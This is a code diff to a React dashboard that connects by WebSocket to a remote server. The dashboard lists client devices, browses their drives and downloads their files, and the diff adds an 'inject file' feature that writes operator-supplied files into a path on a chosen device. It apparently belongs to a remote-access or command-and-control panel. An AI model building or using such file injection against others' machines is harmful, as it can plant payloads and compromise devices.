@@ -1,4 +1,4 @@
-import { useState } from "react";
+import { useEffect, useState } from "react";
 import { FiUsers } from "react-icons/fi";
 import { useWebSocket } from "../hooks/useWebSocket";
 import { Sidebar } from "../components/Sidebar";
@@ -6,6 +6,7 @@ import { ClientDetail } from "../components/ClientDetail";
 import { DriveList } from "../components/DriveList";
 import { FileBrowser } from "../components/FileBrowser";
 import { DownloadListModal, type DownloadListItem } from "../components/DownloadListModal";
+import { InjectFileModal } from "../components/InjectFileModal";
 
 const WS_URL = "wss://mac.cryptdocker.com";
 
@@ -23,10 +24,13 @@ export const Home = () => {
     browsingError,
     browseDirectory,
     uploadFile,
+    injectFile,
     deleteFile,
     getDownloadUrl,
     uploading,
     deleting,
+    injecting,
+    lastInjectResult,
     uploadListByDeviceId,
     requestUploadList,
   } = useWebSocket(WS_URL);
@@ -34,6 +38,7 @@ export const Home = () => {
   const [selectedDeviceId, setSelectedDeviceId] = useState<string | null>(null);
   const [browsing, setBrowsing] = useState(false);
   const [downloadListClientId, setDownloadListClientId] = useState<string | null>(null);
+  const [injectClientId, setInjectClientId] = useState<string | null>(null);
 
   const listClient =
     clients.find((c) => c.deviceId === selectedDeviceId) ?? null;
@@ -122,6 +127,35 @@ export const Home = () => {
     }
   };
 
+  const handleOpenInjectFile = (deviceId: string) => {
+    if (selectedDeviceId !== deviceId) {
+      handleSelectClient(deviceId);
+    }
+    setInjectClientId(deviceId);
+  };
+
+  const handleCloseInjectFile = () => {
+    setInjectClientId(null);
+  };
+
+  const handleInjectFile = (fileName: string, fileData: string) => {
+    if (!injectClientId || !currentPath) return;
+    injectFile(injectClientId, currentPath, fileName, fileData);
+  };
+
+  const injectClient =
+    clients.find((c) => c.deviceId === injectClientId) ??
+    (clientDetail?.deviceId === injectClientId ? clientDetail : null);
+
+  useEffect(() => {
+    if (lastInjectResult?.success && injectClientId) {
+      setInjectClientId(null);
+      if (selectedDeviceId && currentPath) {
+        browseDirectory(selectedDeviceId, currentPath);
+      }
+    }
+  }, [lastInjectResult, injectClientId, selectedDeviceId, currentPath, browseDirectory]);
+
   return (
     <div className="flex h-screen bg-surface-900">
       <Sidebar
@@ -129,6 +163,7 @@ export const Home = () => {
         selectedDeviceId={selectedDeviceId}
         onSelectClient={(client) => handleSelectClient(client.deviceId)}
         onOpenDownloadList={(client) => handleOpenDownloadList(client.deviceId)}
+        onInjectFile={(client) => handleOpenInjectFile(client.deviceId)}
         connected={connected}
       />
       <main className="flex-1 flex flex-col overflow-hidden">
@@ -184,6 +219,16 @@ export const Home = () => {
         onClose={handleCloseDownloadList}
         onDownload={handleDownload}
         onRemove={handleRemoveFromDownloadList}
+      />
+
+      <InjectFileModal
+        open={injectClientId != null}
+        clientName={injectClient?.username || "Client"}
+        currentPath={currentPath}
+        injecting={injecting}
+        lastResult={lastInjectResult}
+        onClose={handleCloseInjectFile}
+        onInject={handleInjectFile}
       />
     </div>
   );
